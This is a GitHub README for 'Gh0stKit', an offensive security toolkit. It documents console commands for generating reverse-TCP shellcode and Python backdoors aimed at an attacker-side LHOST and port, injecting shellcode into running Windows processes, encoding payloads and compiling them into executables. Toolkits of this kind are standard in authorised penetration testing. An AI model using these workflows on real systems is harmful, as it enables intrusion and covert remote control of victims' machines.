# Gh0stKit - A Multi-Purpose Exploitation Toolkit

![Gh0st](https://i.pinimg.com/736x/51/5f/22/515f222302409b4fd1aebd6868c3e1ad.jpg)




#### *gh0stkit is a versatile exploitation toolkit designed for penetration testers, security researchers, and red teamers. It provides a wide range of features, including shellcode generation, backdoor creation, process injection, encoding, and executable generation for multiple platforms.*
### **Author:**
[Livepwn](https://github.com/livepwn)
## Features
- Shellcode Generation: Generate shellcode for various platforms (Linux x86/x64, Windows x86/x64, ARM).

- Backdoor Creation: Create Python-based backdoors for Windows and Linux.

- Process Injection: Inject shellcode into running processes (Windows only).

- Encoding Tools: Encode data using XOR, Base64, AES, and ROT13.

- Executable Generation: Compile shellcode into executables for Windows and Linux.

## Installation
### Prerequisites
- Python 3.x

- colorama library (pip install colorama)

- pyfiglet library (pip install pyfiglet)

- pycryptodome library (pip install pycryptodome)

- mingw (for Windows executable generation)

- nasm and ld (for Linux executable generation)

## Installation Steps
### Clone the repository:

```
git clone https://github.com/livepwn/gh0stkit.git

cd gh0stkit
  ```
### Run the tool:

```
python gh0st.py 

Alert: Donot run this tool with sudo or chmod.
```
### Usage
#### Main Menu
- When you run the tool, you'll see the main menu:

```
gh0st > 
Available commands:

help: Show the help menu.

use <module>: Switch to a specific module (e.g., use shellcode).

show <database>: Show available options for a module (e.g., show shellcodes).

os <command>: Execute an OS command.

clear: Clear the screen.

exit: Exit the tool.
```
### Modules
1. Shellcode Module
- Generate shellcode for reverse TCP connections.

### Commands:

- set <option> <value>: Set options like LHOST, LPORT, and PLATFORM.

- generate: Generate shellcode.

- show options: Show current options.

#### **Example:**

```
gh0st > use shellcode
gh0st/shellcode > set LHOST 192.168.1.100
gh0st/shellcode > set LPORT 4444
gh0st/shellcode > set PLATFORM linux/x64
gh0st/shellcode > generate
```
2. Backdoor Module
- Create Python-based backdoors.

### Commands:

- set <option> <value>: Set options like LHOST, LPORT, and PLATFORM.

- generate: Generate a backdoor.

- show options: Show current options.

#### **Example:**
```
gh0st > use backdoor
gh0st/backdoor > set LHOST 192.168.1.100
gh0st/backdoor > set LPORT 4444
gh0st/backdoor > set PLATFORM python/windows
gh0st/backdoor > generate
```
3. Injector Module
- Inject shellcode into a running process (Windows only).

### Commands:

- inject <pid>: Inject shellcode into a process with the specified PID.

#### **Example:**
```
gh0st > use injector
gh0st/injector > inject 1234
```
4. Encoder Module
- Encode data using XOR, Base64, AES, or ROT13.

### Commands:

- set <option> <value>: Set options like ENCODING and KEY.

- encode <data>: Encode the provided data.

- show options: Show current options.

#### **Example:**

```
gh0st > use encoder
gh0st/encoder > set ENCODING xor
gh0st/encoder > set KEY secret
gh0st/encoder > encode HelloWorld
```
5. Executable Module
- Compile shellcode into executables for Windows and Linux.

### Commands:

- set <option> <value>: Set options like PLATFORM and OUTPUT.

- generate: Generate an executable.

- show options: Show current options.

#### **Example:**

```
gh0st > use executable
gh0st/executable > set PLATFORM windows
gh0st/executable > set OUTPUT payload.exe
gh0st/executable > generate
```
#### **Examples:**
- Generate a Linux Reverse TCP Shellcode
```
gh0st > use shellcode
gh0st/shellcode > set LHOST 192.168.1.100
gh0st/shellcode > set LPORT 4444
gh0st/shellcode > set PLATFORM linux/x64
gh0st/shellcode > generate
```
- Create a Python Backdoor for Windows
```
gh0st > use backdoor
gh0st/backdoor > set LHOST 192.168.1.100
gh0st/backdoor > set LPORT 4444
gh0st/backdoor > set PLATFORM python/windows
gh0st/backdoor > generate
```
- Inject Shellcode into a Process
```
gh0st > use injector
gh0st/injector > inject 1234
```
- Encode Data with XOR
```
gh0st > use encoder
gh0st/encoder > set ENCODING xor
gh0st/encoder > set KEY secret
gh0st/encoder > encode HelloWorld
```
- Generate a Windows Executable
```
gh0st > use executable
gh0st/executable > set PLATFORM windows
gh0st/executable > set OUTPUT payload.exe
gh0st/executable > generate
```
### Contributing
Contributions are welcome! Please open an issue or submit a pull request for any improvements or bug fixes.

### License
This project is licensed under the Apache-2.0 License. See the LICENSE file for details.

### Disclaimer
This tool is intended for educational and ethical purposes only. Do not use it for illegal activities. The authors are not responsible for any misuse of this tool.

Contact
For questions or feedback, please open an issue on GitHub or contact me.
email: livepwn@gmail.com
